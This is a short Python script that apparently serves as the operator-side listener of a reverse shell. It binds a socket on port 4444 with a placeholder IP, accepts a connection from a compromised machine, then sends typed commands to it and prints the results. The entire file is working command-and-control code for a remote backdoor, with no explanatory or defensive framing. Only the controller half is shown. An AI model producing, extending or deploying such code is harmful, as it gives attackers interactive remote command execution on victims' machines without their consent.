import socket

class Listener :

    def __init__(self , ip , port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[*] Listening for incoming connections...")
        self.connection , self.address = listener.accept()
        print("[*] Connection established!")

    def execute_remotely(self, command):
        self.connection.send(command.encode())
        return self.connection.recv(1024).decode()
    
    def run(self):
        while True:
            command = input(">>")
            result = self.execute_remotely(command)
            print(result, end="")

my_listener = Listener("ip address here" , 4444 )
my_listener.run()
